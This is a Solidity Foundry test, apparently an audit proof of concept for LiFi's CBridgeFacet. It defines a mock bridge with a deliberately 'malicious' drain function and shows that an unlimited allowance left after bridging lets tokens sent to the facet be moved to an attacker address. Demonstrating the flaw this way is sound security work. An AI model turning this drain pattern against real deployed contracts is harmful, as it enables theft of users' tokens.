// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {CBridgeFacet} from "lifi/Facets/CBridgeFacet.sol";
import {ICBridge} from "lifi/Interfaces/ICBridge.sol";
import {ILiFi} from "lifi/Interfaces/ILiFi.sol";

contract MockCBridge is ICBridge {
    address public token;

    constructor(address _token) {
        token = _token;
    }

    function send(
        address _receiver,
        address _token,
        uint256 _amount,
        uint64,
        uint64,
        uint32
    ) external override {
        // simulate bridge pulling tokens
        MockERC20(_token).transferFrom(msg.sender, address(this), _amount);
    }

    function sendNative(
        address,
        uint256,
        uint64,
        uint64,
        uint32
    ) external payable override {}

    // malicious function to drain tokens using remaining allowance
    function drain(address from, address to, uint256 amount) external {
        MockERC20(token).transferFrom(from, to, amount);
    }
}

contract CBridgeFacetAllowanceTest is Test {
    MockERC20 internal token;
    MockCBridge internal bridge;
    CBridgeFacet internal facet;
    address internal attacker = address(0xbeef);

    function setUp() public {
        token = new MockERC20("Mock", "MOCK", 18);
        bridge = new MockCBridge(address(token));
        facet = new CBridgeFacet(ICBridge(address(bridge)));

        token.mint(address(this), 100 ether);
        token.approve(address(facet), type(uint256).max);
    }

    function test_UnlimitedAllowanceAllowsTokenDrain() public {
        ILiFi.BridgeData memory bridgeData = ILiFi.BridgeData({
            transactionId: bytes32("tx"),
            bridge: "",
            integrator: "",
            referrer: address(0),
            sendingAssetId: address(token),
            receiver: address(0x1234),
            minAmount: 10 ether,
            destinationChainId: 2,
            hasSourceSwaps: false,
            hasDestinationCall: false
        });

        CBridgeFacet.CBridgeData memory cData = CBridgeFacet.CBridgeData({
            maxSlippage: 0,
            nonce: 0
        });

        facet.startBridgeTokensViaCBridge(bridgeData, cData);

        // allowance remains set after bridging
        assertEq(
            token.allowance(address(facet), address(bridge)),
            type(uint256).max
        );

        // attacker sends tokens to facet and bridge drains them
        token.mint(address(facet), 5 ether);
        bridge.drain(address(facet), attacker, 5 ether);

        assertEq(token.balanceOf(attacker), 5 ether);
    }
}

